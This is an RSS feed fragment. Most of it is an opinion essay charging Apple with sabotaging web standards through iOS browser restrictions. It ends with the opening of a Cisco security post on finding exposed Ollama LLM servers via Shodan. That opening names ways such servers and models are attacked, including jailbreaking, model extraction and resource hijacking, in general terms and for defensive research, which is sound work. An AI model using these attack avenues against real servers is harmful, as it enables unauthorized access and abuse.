    &lt;p&gt;The result has been API enclosure; appropriation of commodity capabilities that themselves are standards-based ‚Äî e.g., USB, Bluetooth, NFC, file storage, etc. ‚Äî by a proprietary ecosystem and denial of even the safest and most privacy-preserving versions of those features by open, interoperable, and standards-based application platforms.&lt;/p&gt;
    &lt;p&gt;This, in turn, has created a winner-take-all dynamic inside the app store, harming privacy, security, and competition in the process.&lt;/p&gt;
    &lt;head rend="h2"&gt;Apple's Transgressions Against Voluntary Adoption&lt;/head&gt;
    &lt;p&gt;This strategy relies on a set of interlocking policies that harm competitors and prospective challengers. The sabotage of voluntary adoption lies at its heart. A Bill of Particulars for crimes against the web and internet community springs from a relatively small set of undisputed facts.&lt;/p&gt;
    &lt;p&gt;Apple has:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Restricted competitors from delivering their own implementations of web and internet standards, depriving them access to Apple's monopolised controls of influential users.&lt;/item&gt;
      &lt;item&gt;Forced all iOS browsers to use Apple's own, defective and impoverished, implementations, depriving users of choice and destroying the market's ability to select for better ideas and implementations.&lt;/item&gt;
      &lt;item&gt;Compelled browser engine monoculture and, in so doing, consistently undermined user security and privacy.&lt;/item&gt;
      &lt;item&gt;Attempted to use contractual terms to dissuade competitors from extending browsers to support standards that Apple disfavours.&lt;/item&gt;
      &lt;item&gt;Serially misled regulators and the public when presented with evidence of the harms that spring directly from the above.&lt;/item&gt;
      &lt;item&gt;Objected spuriously in bad faith within standards bodies to prevent standardisation of features which Apple offered no counter-proposal.11&lt;/item&gt;
      &lt;item&gt;Since at least 2015, delivered explicitly pejorative UI and marketing to discourage use of open and interoperable technologies that might benefit users at its own expense.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Through these and other overt acts, Apple has worked to disempower users, depriving them of choice in the market, and thereby devaluing the effectiveness of interoperable, standards-based platforms.12&lt;/p&gt;
    &lt;p&gt;These acts are not simply the competitive acts of a fierce market participant. Apple has done violence to the founding ethos of internet and web standards development. Instead of honourably withdrawing from those groups, Apple has maintained a charade of engagement, and gaslights other participants while actively sabotaging the principle of voluntary adoption that internet standards are predicated on.&lt;/p&gt;
    &lt;head rend="h3"&gt;Unilateral Off-Ramps&lt;/head&gt;
    &lt;p&gt;It must be emphasised that Apple has never been forced to suppress its competitors, nor to create an anticompetitive landscape. At every moment, Cupertino's senior management have retained intellectually consistent choices that allow it to pursue growth of Apple's superior (we are told) native app ecosystem without creating conditions that threaten browser choice or the good functioning of internet standards.&lt;/p&gt;
    &lt;p&gt;Let's consider two: all safe browsers, and no browsers.&lt;/p&gt;
    &lt;p&gt;Apple could, of course, simply enable the same sort of level playing field for high-quality browsers that every competing vendor has for nearly the web's entire history, and which Apple has itself facilitated on macOS.13 Any plausible restriction owing to available system resources has long been overcome by progress in mobile hardware, particularly within Apple's ecosystem.14 Early mobile era justifications based on API richness and resource availability were falsified by even the lowliest Androids to more than a decade ago.&lt;/p&gt;
    &lt;p&gt;The only conscionable restrictions on competing browser engines spring from demonstrable failures to safeguard security. As other vendors have generally had better track records vs. Apple regarding sandboxing strength, security response times, patch gap width, and consistent coverage for users on older OS versions, this should be no practical obstacle.&lt;/p&gt;
    &lt;p&gt;Lest Apple's defenders worry about the impacts on the company, under true browser choice, Apple retains considerable market advantages, including (but not limited to) pre-installation, lower structural costs15, and continued voluntary feature adoption, allowing it to earn users through differentiation.16 Such bulwarks have allowed Safari to retain considerable share on macOS in spite of stiff competition and Safari's poor track record on security and standards conformance.&lt;/p&gt;
    &lt;p&gt;Alternatively, Apple could withdraw Safari while forbidding all browsers on iOS. This is a fully consistent position, and one that has been available to Apple from the moment of the iPhone's release. The iPod did not include a browser, and many subsequent Apple OSes lack functional browsers. iOS and VisionOS are uniquely deficient in this regard.17&lt;/p&gt;
    &lt;p&gt;Either way, the choice to undermine choice and standards has rested entirely with Apple. At every moment it has had intellectually honest solutions available to resolve these contradictions of its own design. Apple cannot claim the situation is anyone else's fault, or that it has had no choice.&lt;/p&gt;
    &lt;head rend="h2"&gt;How Apples Crimes Differ From Prior Episodes&lt;/head&gt;
    &lt;p&gt;It should be obvious from the proceeding sections that I do not consider Apple's mere failure to implement standards I personally approve of to rise to the level of the transgression worthy of sanction.&lt;/p&gt;
    &lt;p&gt;Under voluntary implementation, every vendor is free to ship whatever they please, including Apple. Whilst it may be sad, or even damaging, when features go missing from important products, that is not a calamity. In functioning markets, this is simply an input to be priced. Among browsers, this has traditionally been experienced as vendors gaining or losing share to the extent they support otherwise-interoperable content.&lt;/p&gt;
    &lt;p&gt;And so it is not enough to cite a lack of features, bungled implementations, peevish behaviour in working groups ‚Äî or even rank dishonesty ‚Äî as reason for censure. These are, to a greater or lesser degree, players playing the game within the rules. Some tactics may be distasteful, but reside squarely within the "awful but lawful" category. Venues dedicated to free exchanges of views should allow them, with sanctions for poor behaviour meted out in the social realm, if at all.&lt;/p&gt;
    &lt;p&gt;Apple's outrages against this community are more fundamental, and more dangerous.18&lt;/p&gt;
    &lt;p&gt;Some will see here a parallel to the Paradox of Tolerance, and I do not believe this is mistaken. Standards bodies can, and should, admit many positions by their participants, but bestowing membership in good standing to those actively uprooting the basis for standards is to ensure that standards, and the ecosystems that depend on them, wither and die.&lt;/p&gt;
    &lt;p&gt;By subverting the voluntary nature of open standards, Apple has defanged them as tools that users might use against the totalising power of native apps in their digital lives. This high-modernist approach is antithetical to the foundational commitments of internet standards bodies and, over time, erode them.&lt;/p&gt;
    &lt;p&gt;Indeed, no other vendor has achieved what Apple has in the realm of anticompetitive suppression of the web. We must not imagine that Apple would stop at the Application layer given a chance. The same mechanism threatens voluntary feature adoption in every other layer of the stack, too.&lt;/p&gt;
    &lt;head rend="h2"&gt;Necessary, Proportional Responses&lt;/head&gt;
    &lt;p&gt;The web and internet communities must understand not only the threat, but the ongoing harms to the cause of the web and of internet standards. It seems to me that this point has hardly been engaged, let alone won, within the walls of SDOs. But if it were, then what? What, practically, can be done?&lt;/p&gt;
    &lt;p&gt;The founding documents of internet SDOs do not include mechanisms for censure of these violative acts. The W3C's bylaws, for example, only speak to membership in good standing in relationship to payment of dues. Regardless, it is possible ‚Äî and I believe urgent ‚Äî to do more.&lt;/p&gt;
    &lt;p&gt;First, proposals can be raised to amend those documents to include mechanisms for censure by votes of the membership for actions such as those alleged here. These are likely to fail, and will surely be rejected on a first attempt, but the act of constituents considering these questions has power in and of itself. Raising proposals for discussion at plenary meetings and in visible fora can, at a minimum, elicit a response to the charges levied here. That, on its own, is valuable to the community.&lt;/p&gt;
    &lt;p&gt;Next, leadership boards with moral authority can write persuasively on the question. The W3C's Advisory Board and Technical Architecture Group and the IETF's Internet Architecture Board have the ear of the membership, even on non-technical topics, should they choose to weigh in on the side of the continued relevance of their convening organisations.&lt;/p&gt;
    &lt;p&gt;Most importantly, individual delegates to working groups of all sorts can recognise that Apple's compellence is illegitimate and corrosive. Having done so, they can resolve not to accept "Apple does not comment on future products" as a viable response to questions about implementation timelines.&lt;/p&gt;
    &lt;p&gt;As long as Cupertino demands and unjustly defends a monopoly, it is incumbent to demand responsibility for the consequences of Apple's failures.&lt;/p&gt;
    &lt;p&gt;Apple alone can choose to support features within WebKit and allow them in other iOS browsers, even under compellence, and even if it does not to enable them in Safari. It is simply illegitimate for Apple to claim that it cannot or should not allow other vendors to reach feature parity with competing engines.&lt;/p&gt;
    &lt;p&gt;The sham of WebKit as an Open Source project is incompatible with disavowal of features that other vendors would flag on for their iOS users if allowed. Compelled implementation and the destruction of voluntary adoption should not be a shield against critique, but instead should heighten expectations based on the responsibilities Apple agues it should be singularly entrusted with, despite Safari and WebKit's trailing record on standards' conformance, security, and privacy.&lt;/p&gt;
    &lt;p&gt;Apple alone must be on the hook to implement any and every web platform feature shipped by any and every other engine. So long as competing vendors are forced into the App Store and must use Apple's engine, Apple should bear the costs of completeness and feature quality. So long as Cupertino demands implementation compellence, the demand must be echoed back: parity with browser features on other Operating Systems is the minimum bar.&lt;/p&gt;
    &lt;p&gt;WebKit purports to be Open Source, but in practice Apple has used it to undermine the "bring your own code" foundation of OSS. It is illogical for Apple to cite a disinterest in a feature in Safari as a reason for Apple not to be expected to implement those features in iOS's WebKit binary, making them available for other embedders to flag on.&lt;/p&gt;
    &lt;p&gt;Fundamentally, the web and internet community must stop accepting the premise that Apple should benefit from the protections and privileges that voluntary adoption affords whilst it denies those benefits to others.19&lt;/p&gt;
    &lt;p&gt;Lastly, and perhaps most controversially, delegates and organisations can use their positions to vote against Apple's personnel in elections to leadership positions within internet and web SDOs. It is, of course, inconsistent for Apple to hold positions of influence in organisations they are actively suppressing, and fellow participants are under no obligation to pretend otherwise or hand Apple formal or even persuasive power within these groups.&lt;/p&gt;
    &lt;head rend="h3"&gt;Why Now?&lt;/head&gt;
    &lt;p&gt;In raising these questions, colleagues have invariably asked "why now? What changed?"&lt;/p&gt;
    &lt;p&gt;Beyond the threshold point that the damage done is cumulative, and therefore it isn't necessary to identify specific instances to discuss the rot Apple's influence has caused, it's fair to ask why anyone should be agitated tomorrow when they might not have been yesterday.&lt;/p&gt;
    &lt;p&gt;Most of the factors involved have indeed changed very gradually, and humans are famously poor judges of slowly emergent threats. Apple's monopoly on influence, Cupertino's post-2009 WebKit priorities, the suppression of browser competitors, and the never-ending parade of showstopping bugs are all gradually emergent factors. Despite all of this long-running, unrefuted evidence, many continue to think of Apple an ally of the web for helpful acts now more than 15 years old.&lt;/p&gt;
    &lt;p&gt;But recent events must shake us awake. Apple's petulant attempt to duck regulations, destroy the web as a competitor for good, and frame regulators for the dirty deed was shocking. In recurring misrepresentations to regulators before and since, it has dissembled about its role in suppressing the web, and through its demand for secrecy in quasi-standards processes, has worked tirelessly to cover its tracks.&lt;/p&gt;
    &lt;p&gt;Taken individually, and in ignorance of iOS's implementation compellence, forced monoculture and habitual security failures, and strategic starvation of the Safari team these shameful acts would simply indicate another monopolist behaving badly. It is only when considered alongside the wider set of facts that the anti-standards strategy and impact become clear.&lt;/p&gt;
    &lt;head rend="h2"&gt;Do Standards Matter?&lt;/head&gt;
    &lt;p&gt;Like most who have dedicated the greater proportion of their working lives to the cause of an open and interoperable web, the questions and conclusions offered here shock me as well.&lt;/p&gt;
    &lt;p&gt;In the end, however, the question "do standards matter any more?" is intrusive, despite my aversion to reconsidering a question whose answer I thought obvious. But in light of the past decade's sidelining of the web, we must grapple with the consequences. To allow Apple to continue to abuse the foundation of standards without acknowledgement would be a failure of honesty towards my own intellectual commitments.&lt;/p&gt;
    &lt;p&gt;My personal affinity for the many talented and thoughtful people that Apple has sent to standards bodies over the years ‚Äî including those I think of as friends ‚Äî has, on reflection, been an emotional blind spot. But here we are. The realisation that they have been an unwitting fifth column against the web is nauseating for me, and I expect many will loudly reject the conclusion. I do not blame them.&lt;/p&gt;
    &lt;p&gt;For all the harm Apple has done to the web and to competition, I had hoped that it would relent before any of this became necessary. Like most web developers, I harboured hope that, true to Steve Job's promise in '07, Apple would let the web be a "sweet solution" for delivering safe, powerful applications. Piggybacked on that hope was a belief that a relevant mobile web would bolster the relevance of standards. But Cupertino has gone a different way, choosing profit over collaboration and the needs of users.&lt;/p&gt;
    &lt;p&gt;The web matters too much for the standards-based future it represents to fade without so much as a nod.&lt;/p&gt;
    &lt;head rend="h2"&gt;FOOTNOTES&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Or, if you like, "liberaltarian". ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;A faith I do not share. Markets fail frequently, never mind that most goods are hardly substitutable, thinly traded, and lack reliable public prices. All of this means that the information capacity of markets a priori the rationalising effect of standards and market fairness regulation is heavily suspect.&lt;/p&gt;
        &lt;p&gt;But even for those that take a market fundamentalist perspective, restrictions on trade such as Apple has imposed are offensive to the basic logic of the market's role in bettering of society. Only those who would see markets subjugating all, forever, because of one-time power imbalances can be sanguine about what Apple has done&lt;/p&gt;
        &lt;p&gt;We do not have to grant that pro-totalitarian arguments in technology are in good faith given what we know about where unchecked power reliably leads. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It is not original to note that there is an inherent contradiction in the idea of liber(al)tarian participants in standards bodies collaborating through non-market mechanisms. We do not have to ignore it, however, or even treat those holding both an affinity to open standards and libertarian ideals as hypocrites, in order to accept that the development of standards is often a creative act of critique for which there is no other functional venue (or, if you like, "market").&lt;/p&gt;
        &lt;p&gt;Proposals for open internet standards often begin as personal drafts of individual authors, working in a community of like-minded developers experiencing similar challenges and working to design solutions. These proposals are situated in a context that is often opaque to those outside narrow circles, and the communities that form around them trade in reputation as much as any other currency.&lt;/p&gt;
        &lt;p&gt;In addition to personal status, there is a distinguishable ideology at work:&lt;/p&gt;
        &lt;p&gt;The open systems ideology that was developed in computing between the 1970s and the 1990s embodied several assumptions articulated in previous open system visions in diplomacy, economics, philosophy, and engineering. These assumptions included:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;an economic commitment to global markets;&lt;/item&gt;
          &lt;item&gt;a moral support of international and multicultural ties;&lt;/item&gt;
          &lt;item&gt;a political opposition to centralized power ‚Äî either in governments or in monopolies ‚Äî that threatened individual autonomy;&lt;/item&gt;
          &lt;item&gt;a belief that technical professionals could achieve these economic, moral, and political aspirations through cooperation and standardization.&lt;/item&gt;
        &lt;/list&gt;
        &lt;p&gt;These principles stand as critique to older, less open ways of working. Technology that is more interoperable makes a larger space for critique through code and the market, and that is essential to the openness of any society that depends on software as much as modern, western nations do today. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The history of Bell Labs, the antitrust battles of IBM, the birth of Unix, and the expectations of "common carrier" treatment for data transmission help to situate the thinking of participants in setting up the foundational standards bodies that we now take for granted. Major battles were fought to keep computing out of the hands of a few corporations with outsized power, and the consequences continue to reverberate.&lt;/p&gt;
        &lt;p&gt;It is my personal view that it has been the good work of antitrust and anti-monopoly reformers ‚Äî both within and outside government ‚Äî that made it possible for other parties to believe in the abstraction of functional markets. Functioning markets are not, in fact, self-organising, and are enabled explicitly by law that helps to minimise noise in the channel (e.g., from fraud).&lt;/p&gt;
        &lt;p&gt;That self-identified libertarians (along with the rest of society) have benefited dramatically from the gains enabled by these anti-monopoly regimes is not in doubt; the only mystery is how fervently some cling to the belief that regulation must be problematic as a way to skip past its content and ignore engaging on substance. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Without an "all clear" signal for explicit standardisation, antitrust law in most advanced nations would explicitly forbid the sorts of coordination among industry peers that standards bodies facilitate. Authorities permit, and even encourage, standardisation in contrast to other forms of collaboration because the positive externality benefits of reduced friction to trade from interoperability is so compelling. For more on the history and structure of this now-international regime, see Russell (2014) ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;One needs to look no further than tech CEOs lining up to hail the rise of explicitly fascist leaders and ply them with gifts, to understand the ways in which this corruption corrodes our hopes for open, tolerant societies. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;This is not an accusation to be levelled lightly, and not without overwhelming evidence. But that evidence has accrued, and so I feel compelled to speak.&lt;/p&gt;
        &lt;p&gt;Apple are known both to be capricious and retributive, and its antipathy towards Khronos provides an excellent example of the decade-length grudge-holding for which Cuptertino is infamous. I therefore write this post advisedly and with trepedation. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;More than twenty years into the experience of Open Source as a force in software, we can clearly discern that the licence of source code is not, in-and-of itself, a solution to the imbalances inherent in software's relationship to users, or even to other parties with the capacity to develop software.&lt;/p&gt;
        &lt;p&gt;I believe that history demonstrates clearly that (F)OSS licensing and effective governance are only related by the intellectual and commercial commitments of those building software, and are therefore easily co-opted by wealthy and powerful firms.&lt;/p&gt;
        &lt;p&gt;We have witnessed the limits of forking as a bulwark against bad behaviour, through both the persistent upward reach of firmware into "open" systems, and through capture in higher layers due to the carrying costs of complex systems. Licensing has also been little help in courts against large and determined enemies of OSS and the freedoms it attempts preserve. The limits of licensing, and the lack of IP defence pooling inherent in common licences, create risks that successful firms and projects hit regularly.&lt;/p&gt;
        &lt;p&gt;At the limit, (F)OSS licensing is not a significantly disruptive force against wealthy and powerful technology firms, but rather a tool that is useful to peer-level adversaries. For OSS licences and defences to have purchase in practice, a significantly endowed group of technologist's interests must be at stake. The interests of informed and financially capable technologists and the firms that use their software bear only passing resemblance to the needs and interests of society more broadly.&lt;/p&gt;
        &lt;p&gt;From this perspective, we can understand (F)OSS as complementary to standards development, but unable to fully replace standards-based interoperability as an attenuating force on the power of software in the lives of users. Standards retain a unique ability to build space for challengers within and between proprietary products, which (F)OSS do not. The power of SDOs to pool the patent interests of proprietary players has parallels in (F)OSS, but with more clarity and lower risk, further accelerating practical interoperability.&lt;/p&gt;
        &lt;p&gt;Therefore, we must understand that it is a rhetorical and intellectual trap to consider (F)OSS a replacement for standards. Each hasten interoperability and attenuate power in different and complementary ‚Äî but not substitutable ‚Äî ways, and both mechanisms are healthier when the other succeeds. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The EC, having borne witness to Apple's appalling behaviour within its borders, and more generally to boot, was having none of it.&lt;/p&gt;
        &lt;p&gt;The full finding (PDF) is a masterclass in even-handed consideration, and as such it is not surprising that Apple's legal and marketing fictions failed. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Helpfully for Apple, the conversation around privacy and technology has barely progressed past Apple's anti-Google and anti-Facebook kayfabes.&lt;/p&gt;
        &lt;p&gt;Privacy advocates are regularly taken in by Apple's marketing, and the tech press remains in a largely stenographic mode. None of this is to say that Google or Facebook are good actors (they are not), only that Apple is also not on the level.&lt;/p&gt;
        &lt;p&gt;We can begin an analysis by noting that Apple does not encourage users to move their computing to the web where browsers can attenuate the worst invasions of privacy. Browsers do not provide nearly as much information to trackers "for free" as even the most locked-down native app in Apple's ecosystem, and Apple know this.&lt;/p&gt;
        &lt;p&gt;Next, Apple has not funded lobbying and regulatory outreach efforts to establish privacy laws worth a damn. Instead, it channels huge amounts into defeating right-to-repair legislation and defeating browser engine choice around the world, including going as far as funding astroturf groups to provide Cupertino's views in stereo.&lt;/p&gt;
        &lt;p&gt;Moreover, Apple takes no responsibility for its historical role in the growth of of tracking via the native API surfaces Apple created relative to the web, failing to demand audits of data use by App Store participants, or to even set policy about acceptable uses of data collected via App Store-vended applications.&lt;/p&gt;
        &lt;p&gt;Apple does not even forbid pervasive "ad blocker blocking" by the worst actors in its ecosystem, even when interventions are trivial from a policy and technical perspective.&lt;/p&gt;
        &lt;p&gt;That all of this aligns with Apple's preference for control over, and taxation of, developers cannot escape comment. It further forces us to entertain the idea that either Apple's position as a defender of privacy is a cynical show, that it is incompetent in technically assessing privacy risks, or that it is so out of touch with the underhanded behaviour of developers that it amounts to an incompetent regulator, asleep at the switch.&lt;/p&gt;
        &lt;p&gt;Depressingly, these are not exclusive choices. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;For a vendor as wealthy as Apple, and one that insists it must maintain a monopoly on implementations of standards-based platforms on the most influential OS ‚Äî particularly one that skims as much cash from the open web as Apple does ‚Äî to object to proposals other vendors ship safely for years, without offering their own designs to address similar needs, is prima facie evidence of bad faith.&lt;/p&gt;
        &lt;p&gt;This case is bolstered by implementation of the same designs to which spurious and unbacked objections were previously raised as regulatory pressure has grown. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It cannot escape notice that Apple's undermining of voluntary adoption most damages interoperable platforms that might challenge the App Store-based native app ecosystem which supports Apple's vertical integration agenda. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Here we must mention other instances of operating systems imperilling browser choice. Microsoft, for instance, was credibly accused of making text less readable on Netscape Navigator.&lt;/p&gt;
        &lt;p&gt;Google, for its part, introduced ChromeOS without any provision for competing browsers. Subsequently, it allowed Android versions of competing browser products using their own engines to register as the default system browser. This is an unsatisfying solution, as Play-based apps are a poor experience on low-end devices and competing browsers are prevented from integrating as deeply as Chrome does. This may not rise to the level of Apple or Microsoft's acts as ChromeOS remains a niche product, ranks lowest in influence, and features a capable browser ‚Äî regardless, the precedent, combined with prior episodes of Microsoft and Apple turning away from their successful and capable browsers, remains troubling. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;No company in the world is more aware of the awesome power and capability of Apple's A-series chips than Apple itself.&lt;/p&gt;
        &lt;p&gt;Apple executives know, for instance, that even the least expensive iPhone produced in the past 5 years is hundreds of times faster than the first iPhones which gave rise to resource-based restrictions on engine choice They are either aware, or can trivially deduce, that there is no legitimate system health or resource-related reason to disallow competing browser engines. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;As I have discussed before, Apple economises on the development of WebKit and Safari not only by failing to fund development of web features in a timely way, drafting on the path-breaking work of others, but also through an (over)reliance on OS components in lieu of more easily defended abstractions. This goes much deeper than only needing to support a single family of operating systems; unlike competitors, Apple directly leans on OS systems where competitors rebuild large swaths of the runtime to enable the web where underlying OS APIs are more limited.&lt;/p&gt;
        &lt;p&gt;The result, for Apple, is reduced headcount and a lower bill-of-materials when producing devices (read: higher profits), owing to higher code page sharing across applications.&lt;/p&gt;
        &lt;p&gt;The consequence for users is an implementation monoculture and slower patch delivery, harming security. Apple's users remain vulnerable to attacks for longer and without recourse to competing alternatives with stronger track records. The downside of all high modernism is brittleness, borne of uniformity, and iOS is no exception. The lack of the ecological diversity that Apple demands undermines security and resilience. This is not a price society should pay for the convenience of a blue chat bubble. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;In testimony before various competition authorities around the world, and in peevish screeds in response to those arguments failing, Apple habitually attempts a rhetorical redirection that unmasks its anti-Popperian thirst for control.&lt;/p&gt;
        &lt;p&gt;It appears to believe, on the strength of brand, that it can win on the ground of "who should rule?," rather than "how can institutions keep bad rulers from doing too much damage?" In so doing, Apple offers an authoritarian model of technology. Cupertino proposes that all sources of control attenuation are themselves totalising, and any compromise forced on the ruler therefore equivalent to a coup.&lt;/p&gt;
        &lt;p&gt;This is nonsense, both practically and historically, and technologists that support democratic norms should reject this framing.&lt;/p&gt;
        &lt;p&gt;History shows clearly that open systems in open societies enable civil society to take many effective positions that attenuate untrammelled power, both of the state and of other actors. We can further see that neither open nor closed systems are full bulwarks against government coercion. The prospects for improved societies must not be invested in autocratic technology firms for the simple reason that they are powerless to deliver it.&lt;/p&gt;
        &lt;p&gt;Apple itself has been forced to compromise in areas such as right-to-repair without any of the apocalyptic prophecies of Cupertino's lobbyists coming to pass.&lt;/p&gt;
        &lt;p&gt;Here Apple, and its extremely vocal band of apologists, will bring up overreaches by others, including disastrous and ill-advised anti-encryption pushes by national governments. The goal of this argument is to sully the idea of democratic control of technology. "How", it asks leadingly, "can anyone trust these people to do what's right for users?"&lt;/p&gt;
        &lt;p&gt;How indeed! For the central point is that we do not have to. Recourse is available (in functioning democracies) through elected representatives and the responsiveness to citizen's concerns. We can even accept that democracies will get many of these issues wrong for a time without seceding any ground to Apple's authoritarian offer. It is intellectually consistent to reject both noxious positions taken by elected officials and offers of high modernist control by firms opposed to the current positions of a government.&lt;/p&gt;
        &lt;p&gt;Apple's arguments are microns deep on the merits. They attempt to erase both the successes of civil society (rather than Apple) in curbing abuses along with Apple's own shameful track record of capitulation to overtly authoritarian regimes.20&lt;/p&gt;
        &lt;p&gt;Apple's framing asserts that total control by a famously unaccountable firm is a Panglossian utopia. That any choice Cupertino makes now, has ever made, or has ever reversed, have unquestionably been the best of all possible choices. That by paying a thousand dollars for a phone, we are but lucky to bask in the glow of such resplendent wisdom.&lt;/p&gt;
        &lt;p&gt;It's all too much to take, at least for anyone with a working memory. As I hope I have demonstrated here, this posture fails on ethical as well as practical grounds.&lt;/p&gt;
        &lt;p&gt;Apple, with all of its power and money, could be an ally to civil society in curbing abuses without claiming total and unaccountable control for itself in the process. It is incumbent on any thinking technologist to reject such land grabs, even when they come wrapped in causes we otherwise support. To do otherwise is to co-sign the doctrine of "who should rule?," a framing that is caustic to both our short-term technical and long-term societal interests. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Paradoxically, it may be Apple's own malign behaviour regarding browser choice that might prevent a "no browsers" policy from being possible today.&lt;/p&gt;
        &lt;p&gt;Even if we were to ignore Cupertino's incentive to maintain browsers on iOS owing to the shockingly large flows of money from Google for search placement (which Apple records as nearly pure profit), regulators may require it to pursue an "all browsers" alternative to fairly redress the harms from the previous 15 years of abuses. Should this come to pass, Cupertino would (again) have no party to blame but itself. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The damage Apple has done to the cause of internet and web standardisation is analogous to the (US) concept of impeachable "high crimes and misdemeanours", rather than better enumerated, more pedestrian infractions. This category covers acts that are destructive to the foundational principles of the enterprise, regardless of narrow legality.&lt;/p&gt;
        &lt;p&gt;Internet SDOs are not set up well to police or react to this class of offence, which may help explain why Apple's violence against the community has gone unremarked for so many years. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Apple engineers should be questioned (politely, but insistently) about timelines for implementation of any feature that any other engine chooses to ship, and failure to provide that timeline should be viewed as ongoing evidence of malfeasance against the internet and web community for as long as Apple withholds the ability for others to bring their own engines and whatever features they choose.&lt;/p&gt;
        &lt;p&gt;If this causes Apple to retreat from sponsoring work in these venues, that is regrettable, but must also be understood as a choice that is entirely within Apple's power to reverse. ‚áê&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The fuller airdrop story creates a cross-pressured narrative in which it is possible to claim that Apple was acting to protect, rather than suppress, A4 protesters. But such a pose must also contend with Apple's own history of failure, first to build a truly private version of a system marketed in those terms, thereby encouraging users in sensitive situations to expose themselves to great risk. Second, Apple's unwillingness to patch post-disclosure.&lt;/p&gt;
        &lt;p&gt;Owing to AirDrop's use of closed protocols that Apple does not make available to developers of competing applications, it also falls exclusively on Apple's shoulders that better solutions were not available to replace Apple's own botched implementation.&lt;/p&gt;
        &lt;p&gt;The story is more complex than "Apple sold protesters up the river," but no publicly available version of events is a defence the argument that Apple is a bellicose marketing outfit with a situational and opportunistic relationship to user privacy and security.&lt;/p&gt;
        &lt;p&gt;When the effect is to expose or debilitate users that rely on the very properties Apple so truculently asserts its competitors fail to deliver, it becomes impossible to defend Cupertino's insistence that it alone should be trusted. ‚áê&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45113304</guid></item><item><title>Finding thousands of exposed Ollama instances using Shodan</title><link>https://blogs.cisco.com/security/detecting-exposed-llm-servers-shodan-case-study-on-ollama</link><description>&lt;doc fingerprint="bd79dc8389161f9e"&gt;
  &lt;main&gt;
    &lt;p&gt;The rapid deployment of large language models (LLMs) has introduced significant security vulnerabilities due to misconfigurations and inadequate access controls. This paper presents a systematic approach to identifying publicly exposed LLM servers, focusing on instances running the Ollama framework. Utilizing Shodan, a search engine for internet-connected devices, we developed a Python-based tool to detect unsecured LLM endpoints. Our study uncovered over 1,100 exposed Ollama servers, with approximately 20% actively hosting models susceptible to unauthorized access. These findings highlight the urgent need for security baselines in LLM deployments and provide a practical foundation for future research into LLM threat surface monitoring.&lt;/p&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;The integration of large language models (LLMs) into diverse applications has surged in recent years, driven by their advanced capabilities in natural language understanding and generation. Widely adopted platforms such as ChatGPT, Grok, and DeepSeek have contributed to the mainstream visibility of LLMs, while open-source frameworks like Ollama and Hugging Face have significantly lowered the barrier to entry for deploying these models in custom environments. This has led to widespread adoption by both organizations and individuals of a broad range of tasks, including content generation, customer support, data analysis, and software development.&lt;/p&gt;
    &lt;p&gt;Despite their growing utility, the pace of LLM adoption has often outstripped the development and implementation of appropriate security practices. Many self-hosted or locally deployed LLM solutions are brought online without adequate hardening, frequently exposing endpoints due to default configurations, weak or absent authentication, and insufficient network isolation. These vulnerabilities are not only a byproduct of poor deployment hygiene but are also symptomatic of an ecosystem that has largely prioritized accessibility and performance over security. As a result, improperly secured LLM instances present an expanding attack surface, opening the door to risks such as:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Unauthorized API Access ‚Äî Many ML servers operate without authentication, allowing anyone to submit queries.&lt;/item&gt;
      &lt;item&gt;Model Extraction Attacks ‚Äî Attackers can reconstruct model parameters by querying an exposed ML server repeatedly.&lt;/item&gt;
      &lt;item&gt;Jailbreaking and Content Abuse ‚Äî LLMs like GPT-4, LLaMA, and Mistral can by manipulated to generate restricted content, including misinformation, malware code, or harmful outputs.&lt;/item&gt;
      &lt;item&gt;Resource Hijacking (ML DoS Attacks) ‚Äî Open AI models can be exploited for free computation, leading to excessive costs for the host.&lt;/item&gt;
      &lt;item&gt;Backdoor Injection and Model Poisoning ‚Äî Adversaries could exploit unsecured model endpoints to introduce malicious payloads or load untrusted models remotely.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This work investigates the prevalence and security posture of publicly accessible LLM servers, with a focus on instances utilizing the Ollama framework, which has gained popularity for its ease of use and local deployment capabilities. While Ollama enables flexible experimentation and local model execution, its deployment defaults and documentation do not explicitly emphasize security best practices, making it a compelling target for analysis.&lt;/p&gt;
